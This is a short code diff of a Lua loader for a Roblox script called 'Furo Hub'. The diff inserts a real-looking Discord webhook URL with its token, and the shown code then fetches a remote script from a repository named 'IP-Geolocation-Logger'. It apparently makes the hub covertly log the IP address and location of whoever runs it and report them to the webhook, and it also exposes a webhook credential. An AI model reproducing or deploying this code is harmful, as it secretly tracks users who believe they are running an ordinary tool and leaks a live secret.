@@ -2,7 +2,7 @@ if getgenv().__FURO_HUB_LOADED__ then
     warn("Furo Hub は既に読み込まれています。スキップします")
     return
 end
-getgenv()["Webhook URL"] = "https://discord.com/api/webhooks/your-webhook-id/your-webhook-token"
+getgenv()["Webhook URL"] = "https://discord.com/api/webhooks/1474095530744217610/BNiKKDzpu3FVveiChVq0YO78tFNKRus7DJb28UG2QD_OJ3pL-8kFWcKxzPJUlcsdYsr7"
 
 local success, response = pcall(function()
 	return game:HttpGet("https://raw.githubusercontent.com/mcantcode/IP-Geolocation-Logger/refs/heads/main/src/main.luau")
